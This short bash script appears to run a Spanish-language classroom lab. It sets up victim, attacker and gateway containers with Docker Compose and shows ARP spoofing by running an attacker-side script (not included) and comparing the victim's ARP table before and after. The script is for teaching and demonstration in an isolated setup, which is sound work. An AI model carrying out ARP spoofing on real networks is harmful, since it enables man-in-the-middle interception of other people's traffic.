#!/usr/bin/env bash
set -euo pipefail
echo "========== PUNTO 11 — ARP SPOOFING [VULNERABLE] =========="
P="docker compose -p p11v -f docker-compose.yml"
trap '$P down -v 2>/dev/null || true' EXIT
$P down -v 2>/dev/null || true
$P up -d --build
sleep 3
VICTIM_MAC=$($P exec victima cat /sys/class/net/eth0/address | tr -d '\r')
ATK_MAC=$($P exec atacante cat /sys/class/net/eth0/address | tr -d '\r')
GW_MAC=$($P exec gateway cat /sys/class/net/eth0/address | tr -d '\r')
echo "[*] MACs: victima=$VICTIM_MAC atacante=$ATK_MAC gateway=$GW_MAC"
$P exec victima ping -c 1 10.9.0.1 >/dev/null 2>&1 || true
echo "[*] Tabla ARP víctima ANTES:"
$P exec victima ip neigh show || true
$P exec atacante python3 /lab/arp_slow.py 10.9.0.20 "$VICTIM_MAC" 10.9.0.1 "$ATK_MAC"
sleep 1
echo "[*] Tabla ARP víctima DESPUÉS (gateway debería apuntar al MAC del atacante):"
$P exec victima ip neigh show || true
$P down -v
